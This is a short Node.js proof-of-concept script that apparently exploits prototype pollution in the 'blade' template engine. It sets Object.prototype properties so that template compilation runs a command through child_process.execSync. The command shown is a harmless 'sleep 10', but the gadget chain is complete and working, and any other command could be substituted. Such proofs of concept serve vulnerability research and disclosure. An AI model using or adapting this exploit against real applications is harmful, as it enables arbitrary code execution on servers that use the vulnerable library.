const blade = require('blade');
const fs = require('fs');
const path = require('path');

Object.prototype.value = "somevalue"
Object.prototype.exposing = ["global.process.mainModule.require('child_process').execSync('sleep 10')"]

// This template includes the `include` directive
const mainFilePath = path.join(__dirname, '/views/include.blade');

fs.readFile(mainFilePath, 'utf8', (err, mainFile) => {
    if (err) throw err;

    blade.compile(mainFile, { filename: mainFilePath, debug: true }, (err, tmpl) => {
        if (err) throw err;

        tmpl({}, function(err, html) {
            if (err) throw err;
            console.log(html);
        });
    });
});